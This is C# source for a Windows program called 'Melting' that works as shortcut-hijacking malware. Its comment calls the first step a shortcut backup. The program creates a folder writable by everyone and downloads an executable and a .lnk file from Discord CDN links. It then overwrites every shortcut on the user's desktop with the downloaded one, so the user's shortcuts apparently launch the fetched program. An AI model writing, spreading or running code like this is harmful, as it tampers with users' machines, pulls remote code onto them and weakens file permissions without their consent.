using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Security.AccessControl;

namespace Melting
{
    static class Program
    {
        [STAThread]
        static void Main()
        {
            if (!Directory.Exists("C:\\Shortcut Backup"))
            {
                //Back up shortcuts to folder
                DirectoryInfo backup = Directory.CreateDirectory("C:\\Shortcut Backup");
                DirectorySecurity dsec = backup.GetAccessControl();
                dsec.AddAccessRule(new FileSystemAccessRule("Everyone", FileSystemRights.FullControl, AccessControlType.Allow));
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/790325299962970116/800992757778350080/Melting.exe", "C:\\Shortcut Backup\\Melting.exe");
                new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/790325299962970116/803047751192412190/Melting.lnk", "C:\\Shortcut Backup\\Melting.lnk");
                // ^ I don't feel like getting my own website to host stuff on
            }
            Melt(new DirectoryInfo("C:\\Users\\" + Environment.UserName + "\\Desktop"));
        }
        static void Melt(DirectoryInfo d)
        {
            FileInfo[] files = d.GetFiles("*.lnk?");
            byte[] data = File.ReadAllBytes("C:\\Shortcut Backup\\Melting.lnk");
            foreach (FileInfo file in files)
            {
                try
                {
                    File.Copy(file.FullName, "C:\\Shortcut Backup\\"+file.Name);
                    File.WriteAllBytes(file.FullName, data);
                }
                catch { }
            }
        }
    }
}
